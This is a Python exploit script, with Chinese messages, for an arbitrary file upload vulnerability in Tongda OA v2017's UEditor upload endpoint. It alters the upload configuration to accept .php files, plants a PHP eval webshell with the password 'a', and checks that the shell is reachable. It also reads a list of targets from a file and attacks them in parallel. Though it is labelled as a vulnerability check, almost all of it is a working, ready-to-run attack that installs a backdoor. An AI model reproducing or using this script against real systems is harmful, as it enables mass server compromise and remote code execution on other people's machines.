import argparse
import multiprocessing
import time

import requests

proxies = {'http': 'http://127.0.0.1:8080'}


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "X_requested_with": "XMLHttpRequest",
        "Accept-Encoding": "gzip",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarycabltuof"
    }
    headerx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = '''------WebKitFormBoundarycabltuof
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
------WebKitFormBoundarycabltuof
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
------WebKitFormBoundarycabltuof
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

hvsutt
------WebKitFormBoundarycabltuof
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
------WebKitFormBoundarycabltuof
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php eval($_POST['a']) ?>
------WebKitFormBoundarycabltuof
Content-Disposition: form-data; name="mufile"

submit
------WebKitFormBoundarycabltuof--
'''
    upload_url = target_url + 'module/ueditor/php/action_upload.php?action=uploadfile'
    print(now_time() + " [INFO]     正在检测通达OA v2017 action_upload任意文件上传漏洞")
    url = target_url + 'hvsutt.php'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(upload_url, headers=headers, data=data, verify=False)
        response = requests.get(url, headers=headerx, timeout=5, verify=False)
        if upload.status_code == 200:
            print(now_time() + ' [SUCCESS]  通达OA v2017 上传webshell成功，请手动检测wbshell 默认密码为a:')
            print(now_time() + ' [SUCCESS]  {}'.format(url))
        else:
            print(now_time() + ' [WARNING]  通达OA v2017 action_upload任意文件上传漏洞不存在')
    except:
        print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ")


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        print('\nCTRL+C 退出')
